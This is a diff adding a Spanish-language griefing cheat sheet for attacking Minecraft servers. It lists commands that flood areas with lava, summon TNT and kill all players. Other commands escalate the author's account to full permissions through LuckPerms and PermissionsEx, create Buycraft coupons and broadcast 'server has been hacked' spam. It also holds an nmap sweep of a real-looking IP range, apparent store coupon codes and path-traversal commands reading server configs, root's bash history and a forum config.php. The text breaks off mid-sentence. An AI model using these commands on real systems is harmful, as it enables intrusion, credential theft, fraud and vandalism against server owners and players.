@@ -1,0 +1,130 @@
+=====================================================================
+=>>Comandos/Methods de Griefing By Brian R.  #TaliStreet<<=
+=====================================================================
+
+========= GRIEF =========
+/pt /sphere 0 20
+//sphere 0 20
+/br sphere 0 5
+/fill ~-15 ~-15 ~-15 ~16 ~16 ~16 minecraft:air
+/fill ~-15 ~-15 ~-15 ~16 ~16 ~16 minecraft:lava
+/minecraft:fill ~-15 ~-15 ~-15 ~16 ~16 ~16 minecraft:lava
+/summon EnderCrystal
+/summon EnderDragon
+/summon PrimedTnt
+/minecraft:summon PrimedTnt
+======COMANDOS DE SCAN OPS==============
+(COMANDO PRIVADO)
+screen -S edateamos nmap -p 1-20,23-79,81-110,19990-22000,25000-27000,30000-30500,35500-35700,40000-40050,45500-45570,50000-50050,55500-55570,60000-60050,65530-65535 -T5 -A -v -Pn --min-hostgroup 8 --max-hostgroup 8 --open -oN /root/IPSCANNER1.txt 158.69.120-123.*
+(ESTE COMANDO CREA UNA SCREEN, ESCANEA 3 RANGES EN LA MISMA SCREEN Y TE LOS GUARDA
+EN UN BLOC DE NOTAS CON EL NOMBRE QUE LE HAYAS PUESTO)
+
+SCAN BUNGEES:
+
+nmap -p 1-65535 -T5 -v -A -Pn (COMANDO QUE UTILIZO SIEMPRE PARA ESCANEAR BUNGEES)
+
+========= TROLL =========
+/eco give * 99999999
+/minecraft:gamemode 1 @a
+/minecraft:kill @a
+/minecraft:clear @a
+/achievement give * @a
+/minecraft:give @a minecraft:diamond_sword 1 0 {display:{Name:"TaliStreet"},ench:[{id:16,lvl:10000}]}
+========== SPAM =========
+/alert &cServer has been hacked by &4https://github.com/edateamos #TaliStreet
+========= ALERT ==========
+/alert
+/bc
+/ebc
+/essentials:bc
+/essentials:ebc
+/essentials:broadcast
+/essentials:ebroadcast
+/broadcast
+/ebroadcast
+/litebans broadcast
+/execute @a 0 0 0 say Server has been hacked by &4https://github.com/edateamos (Masive Spam)
+======== BUYCRAFT ========
+/buycraft coupon create value 999999999
+/buycraft coupon create value 999999999 code TaliStreet
+======= BUY CODES ========
+ECUACRAFT OWNER OFI 1$ - 9UTF1WZMS3
+ECUACRAFT SHOP - 2GT0FKU6RY
+BLURKIT SHOP - JCJ3DNV2RL
+GGCRAFTS SHOP - VYKL6GF8NW
+MINESPOKY SHOP - 44RVWYN3ER
+MINESPOKY SHOP - BYEKM4P6OY
+======= BUNGEECORD COMMANDS =======
+/alert <mensaje>
+/alertraw <json>
+/bungee
+/end <mensaje>
+/find <jugador>
+/glist
+/greload
+/ip <jugador>
+/perms
+/send <jugador/current/all> <server>
+/server [server]
+======= GROUPMANAGER =======
+/manuadd <jugador> <rango>
+/manudel <jugador>
+/manwhois <jugador>
+======= ULTRAPERMISSIONS =======
+/upc addgroup <jugador> <rango>
+/upc addplayerpermission <jugador> <rango>
+/upc addSuperadmin <jugador>
+/uperms (Menu)
+======= zPermissions ========
+/permissions
+/perm
+/perms
+/zpermissions
+/zperm
+/zperms
+/setrank
+/zsetrank
+/promote
+/rankup
+/zpromote
+/zpermissions player <jugador> set *
+/zpermissions player <jugador> setgroup <grupo>
+/setrank <jugador> <rango>
+/promote jugador
+======= PowerFulPerms ========
+/powerfulperms
+/pp
+/pop
+/pow
+/pp user <jugador> add <permiso>
+/pp user <jugador> setgroup <rango>
+======= LUCKPERMS ========
+/luckperms
+/lp
+/perm
+/perms
+/permission
+/permissions
+/execute edateamos 0 0 0 lp user edateamos permission set *
+/minecraft:execute edateamos 0 0 0 lp user edateamos permission set *
+====== PERMISSIONSEX ======
+/pex
+/permissionsex
+/permissionsex:pex
+/permissionsex:permissionsex
+/execute edateamos 0 0 0 pex user edateamos add *
+/minecraft:execute edateamos 0 0 0 pex user edateamos add *
+===== NETWORKMANAGER ====
+/nmperms
+/networkmanagerperms
+/networkmanagerpermissions
+==== HOLOGRAMAS MYSQL ====
+/hd create a
+/hd readtext a ../LiteBans/config.yml (CONFIG DEL LITEBANS)
+/hd readtext a ../../server.properties (PROPIEDADES DEL SERVER)
+/hd readtext a ../../whitelist.json (SIRVE PARA SABER NICKS QUE ESTÉN EN LA WHITELIST)
+/hd readtext a ../../logs/latest.log (LOGS DEL SERVER)
+/hd readtext a ../../../../root/.bash_history (LOGS DE LA VPS)
+/hd readtext a ../../../../var/html/www/foro/library/config.php (Este metodo va si su foro esta hosteado en la vps del server
+======== IP CHECK =========                 Y su foro esta usando xenforo para saber si usa xenforo es sencillo
+/whois                            vamos a la pagina del foro por ejemplo https://minespoky.net/foro/ y
